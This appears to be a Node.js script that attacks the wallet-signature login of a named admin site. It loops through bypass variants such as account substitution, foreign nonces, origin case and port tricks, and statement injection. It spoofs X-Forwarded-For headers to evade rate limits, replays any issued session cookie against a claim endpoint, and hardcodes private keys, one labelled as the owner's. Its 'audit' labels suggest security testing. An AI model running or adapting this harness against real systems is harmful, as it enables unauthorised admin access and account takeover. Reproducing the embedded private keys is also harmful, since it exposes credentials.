import { createHash } from 'node:crypto';
import { secp256k1, hash160, encodeCashAddress, CashAddressType } from '@bitauth/libauth';
import fs from 'node:fs';

const OWNER_PRIV = '687c95fed064682b60215b6528e660fad3daeec18898d9f7044ba3d0b5440e6c'; // cR5owJHL5…
const TID_PRIV   = '763fe7756d9c1543e2ace6ad9fa352d635291aa359b0b6c5b6869cb2d9d48689';
const BASE = 'https://admin.coin-spectrum.com';
const PROJ = 'admin.coin-spectrum.com';
const PUBKEY_SIGNKEY_TID = 'tid:qpguhk3fzvgh59y72d7f84tvgetal3cv8gex07cwnj';
const PUBKEY_SIGNKEY_BCH = 'bitcoincash:qpguhk3fzvgh59y72d7f84tvgetal3cv8glkr8hr0w';
const PUBLISHED_SIG = 'IG9XffIZCO9Efqjm6/qdSfUyAY+MSpKSJvWpaEQSDPKXYczM58occrGGYUKnsSD7uyJDEp5GAVhTVZ6URohU6dI=';
const OWNER_BCHTEST = 'bchtest:qr4f5sh8lhs50u7xq5568rcqxwk209dz4ynanfnyhh';
const OWNER_BCHMAIN = 'bitcoincash:qr4f5sh8lhs50u7xq5568rcqxwk209dz4yh0hw3nst';

const k = (h) => Uint8Array.from(Buffer.from(h, 'hex'));
const OWNER = k(OWNER_PRIV), TID = k(TID_PRIV);
const ownerTid = encodeCashAddress({ prefix: 'tid', type: CashAddressType.p2pkh, payload: hash160(secp256k1.derivePublicKeyCompressed(OWNER)) }).address;
const ourTid = encodeCashAddress({ prefix: 'tid', type: CashAddressType.p2pkh, payload: hash160(secp256k1.derivePublicKeyCompressed(TID)) }).address;
const vi = (n) => (n < 0xfd ? Buffer.from([n]) : Buffer.from([0xfd, n & 255, (n >> 8) & 255]));
const mh = (m) => { const a = Buffer.from('Bitcoin Signed Message:\n'), b = Buffer.from(m); return createHash('sha256').update(createHash('sha256').update(Buffer.concat([vi(a.length), a, vi(b.length), b])).digest()).digest(); };
const signWith = (priv, msg) => { const r = secp256k1.signMessageHashRecoverableCompact(priv, new Uint8Array(mh(msg))); return Buffer.concat([Buffer.from([27 + r.recoveryId + 4]), Buffer.from(r.signature)]).toString('base64'); };
const build = (account, nonce, { origin = BASE, proj = PROJ, chain, statement, kind } = {}) => {
  const now = new Date(), exp = new Date(Date.now() + 5 * 60000);
  const st = statement ? [statement, ''] : [];
  if (kind === 'link') return [`${PROJ} wants you to link a wallet to your Theseus ID:`, account, '', ...st,
    'Wallet: bchtest:qr4f5sh8lhs50u7xq5568rcqxwk209dz4ynanfnyhh', 'Wallet Chain ID: bch:chipnet',
    `URI: ${origin}/`, 'Version: 1', 'Chain ID: tid:1', `Project: ${proj}`, `Origin: ${origin}`, `Nonce: ${nonce}`,
    `Issued At: ${now.toISOString()}`, `Expiration Time: ${exp.toISOString()}`].join('\n');
  return [`${PROJ} wants you to sign in with your Theseus ID:`, account, '', ...st,
    `URI: ${origin}/`, 'Version: 1', `Chain ID: ${chain || (account.startsWith('tid:') ? 'tid:1' : 'bch:mainnet')}`,
    `Project: ${proj}`, `Origin: ${origin}`, `Nonce: ${nonce}`,
    `Issued At: ${now.toISOString()}`, `Expiration Time: ${exp.toISOString()}`].join('\n');
};
async function nonce(from) {
  if (from === 'cs') {
    const r = await fetch('https://coinspectrum.navigate.st/sync/v2/nonce');
    const t = await r.text();
    return { nonce: JSON.parse(t).nonce, xff: '10.5.5.5', tries: 0 };
  }
  const xff = `10.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 200)}`;
  for (let i = 0; i < 40; i++) {
    const r = await fetch(BASE + '/auth/nonce', { method: 'POST', headers: { 'content-type': 'application/json', origin: BASE, 'x-forwarded-for': xff }, body: '{}' });
    const t = await r.text();
    if (r.status === 200) return { nonce: JSON.parse(t).nonce, xff, tries: i };
    await new Promise((r) => setTimeout(r, 800));
  }
  throw new Error('no nonce');
}
async function verify(body, xff, label) {
  for (let i = 0; i < 6; i++) {
    const x = i === 0 ? xff : `10.${Math.floor(Math.random()*200)}.${Math.floor(Math.random()*200)}.${Math.floor(Math.random()*200)}`;
    const r = await fetch(BASE + '/auth/verify', { method: 'POST', headers: { 'content-type': 'application/json', origin: BASE, referer: BASE + '/', 'x-forwarded-for': x }, body: JSON.stringify(body) });
    const t = await r.text();
    if (r.status !== 429) return { status: r.status, body: t, setcookie: (r.headers.getSetCookie?.() || []).join(' | '), xff: x, retries: i };
    await new Promise((r) => setTimeout(r, 1500));
  }
  return { status: 429, body: 'still limited' };
}

const V = [
  { id: 'wrong_project', account: ownerTid, signer: 'owner', proj: 'coin-spectrum.com' },
  { id: 'badsig', sig: 'badsig' },
  { id: 'body_account_signkey', body: { account: PUBKEY_SIGNKEY_TID } },
  { id: 'body_account_owner', body: { account: ownerTid } },
  { id: 'nonce_cs', nonceFrom: 'cs' },
  { id: 'claim_sign_nonce', claim: (m) => signWith(OWNER, m.match(/Nonce: (\S+)/)[1]) },
  { id: 'claim_sign_nonce_account', claim: (m) => signWith(OWNER, m.match(/Nonce: (\S+)/)[1] + '\n' + ownTid) },
  { id: 'claim_obj_msg_sig', claim: (m) => ({ message: m, signature: signWith(OWNER, m) }) },
  { id: 'link_kind', kind: 'link' },
  { id: 'acct_owner_bchtest_walletchain', account: OWNER_BCHTEST, signer: 'owner', chain: 'bch:mainnet' },
  { id: 'proj_upper', account: ownerTid, signer: 'owner', proj: 'ADMIN.coin-spectrum.com' },
  { id: 'origin_upper', account: ownerTid, signer: 'owner', origin: 'https://ADMIN.coin-spectrum.com' },
  { id: 'origin_port443', account: ownerTid, signer: 'owner', origin: 'https://admin.coin-spectrum.com:443' },
  { id: 'statement_inject', account: ownerTid, signer: 'owner', statement: 'PROMETHEUS-ADMIN-LOGIN' },
];

const only = process.argv.slice(2);
const out = [];
for (const v of V) {
  if (only.length && !only.includes(v.id)) continue;
  const acct = v.account || ourTid;
  const signer = v.signer === 'owner' ? OWNER : TID;
  let n;
  try { n = await nonce(v.nonceFrom); } catch (e) { console.log(v.id, 'NONONCE', e.message); continue; }
  const msg = build(acct, n.nonce, v);
  const sig = v.sig === 'badsig' ? Buffer.alloc(65, 0).toString('base64') : signWith(signer, msg);
  const claim = v.claim ? v.claim(msg) : '';
  const body = { message: msg, signature: sig, claim, ...(v.body || {}) };
  const r = await verify(body, n.xff, v.id);
  const rec = { id: v.id, ts: new Date().toISOString(), nonce: n.nonce, account: acct, claimType: typeof claim === 'string' ? 'str' : Array.isArray(claim) ? 'array' : typeof claim, claim, message: msg, signature: sig, extra: v.body || null, ...r };
  if (r.status === 200 && r.setcookie) {
    const c = await fetch(BASE + '/auth/claim', { method: 'POST', headers: { 'content-type': 'application/json', cookie: r.setcookie.split(' | ')[0], origin: BASE }, body: '{}' }).catch((e) => ({ status: 0, text: async () => String(e) }));
    rec.after_claim = { status: c.status, body: (await c.text()).slice(0, 600) };
  }
  out.push(rec);
  console.log(v.id, '=>', r.status, String(r.body).slice(0, 160));
  fs.mkdirSync('logs', { recursive: true });
  fs.writeFileSync(`logs/${v.id}.json`, JSON.stringify(rec, null, 1));
  try {
    const { execSync } = await import('node:child_process');
    execSync(`git add -A logs && git -c user.email=a@b -c user.name=audit commit -q -m "log ${v.id}" && git push -q origin HEAD:audit-login`, { stdio: 'inherit' });
  } catch (e) { console.log('push failed', e.message); }
}
fs.writeFileSync('logs/RESULTS.json', JSON.stringify(out, null, 1));
